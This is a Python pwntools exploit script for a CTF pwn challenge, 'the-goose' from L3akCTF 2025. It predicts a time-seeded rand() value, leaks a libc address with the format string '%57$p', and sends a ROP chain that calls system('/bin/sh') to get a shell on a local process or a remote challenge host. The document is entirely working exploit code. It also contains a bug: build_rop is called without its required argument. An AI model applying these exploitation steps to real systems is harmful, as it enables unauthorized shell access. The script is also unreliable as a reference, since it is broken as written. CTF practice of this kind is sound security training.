#!/usr/bin/env python3
import ctypes
import sys

from pwn import *

BINARY_PATH = "/ctf-writeups/2025/l3akctf/pwn/the-goose/dist/chall"
LIBC_PATH = "/lib/x86_64-linux-gnu/libc.so.6"
REMOTE_HOST = "34.45.81.67"
REMOTE_PORT = 16004

context.binary = BINARY_PATH
context.log_level = "debug"
context.terminal = ["tmux", "splitw", "-h", "-p 65"]

elf = context.binary
libc = ELF(LIBC_PATH)

is_remote = len(sys.argv) == 2 and sys.argv[1] == "remote"


def attach(r):
    if is_remote:
        return

    bkps = []
    gdb.attach(r, "\n".join(f"break {x}" for x in bkps))


def guess(r, cdll):
    r.sendlineafter(b"> ", b"A")
    r.sendlineafter("honks?", f"{cdll.rand() % 0x5b + 10}".encode())


def leak_libc_base(r):
    r.sendlineafter("again?", b"%57$p")
    r.recvuntil(b"wow ")

    main_ret = int(r.recvuntil(b" ").strip().decode(), 16)
    libc_base = main_ret - libc.libc_start_main_return
    return libc_base


def build_rop(r):
    rop = ROP(libc)
    rop.raw(b"A" * 0x178)
    rop.raw(rop.ret)
    rop.call(libc.sym.system, [next(libc.search(b"/bin/sh"))])
    return rop.chain()


def exploit(r):
    cdll = ctypes.CDLL(LIBC_PATH)
    cdll.srand(cdll.time(0))

    attach(r)

    guess(r, cdll)
    libc.address = leak_libc_base(r)
    payload = build_rop()

    r.sendlineafter("world?", payload)
    r.interactive()


def main():
    if is_remote:
        r = remote(REMOTE_HOST, REMOTE_PORT)
    else:
        r = process(elf.path)

    exploit(r)


if __name__ == "__main__":
    main()
